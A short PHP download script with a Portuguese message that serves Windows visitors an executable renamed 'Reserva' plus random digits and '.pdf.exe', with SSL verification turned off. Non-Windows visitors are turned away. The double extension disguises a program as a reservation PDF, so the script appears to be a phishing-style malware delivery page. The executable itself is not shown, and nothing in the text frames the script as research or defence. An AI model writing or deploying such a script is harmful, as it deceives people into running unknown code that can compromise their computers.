<?php
include 'so.php';

if ( strpos($user_os, 'Windows') === false ) { 
	echo '<meta name="viewport" content="width=device-width, initial-scale=1.0">';
	exit('<h1>O Download só é permitido em um computador Windows.</h1>');
}

$filename = 'Reserva'.rand(111111,999999).'.pdf.exe';

$context = array(
	"ssl"=>array(
		"verify_peer"=>false,
		"verify_peer_name"=>false,
	),
);
$content = "";
$fp = fopen('reserva.exe', "rb", false, stream_context_create($context));

if (!$fp)
die("Error opening file.");
while (!feof($fp))
$content .= fread($fp, 2048);
fclose($fp);

$fp=fopen($filename, "w");
fwrite($fp, $content);
fclose($fp);

header('Content-Description: File Transfer');
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename='.basename($filename));
header('Content-Transfer-Encoding: binary');
header('Expires: 0');
header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
header('Pragma: public');
header('Content-Length: ' . filesize($filename));
ob_clean();
flush();
readfile($filename);
exit;

exit();

?>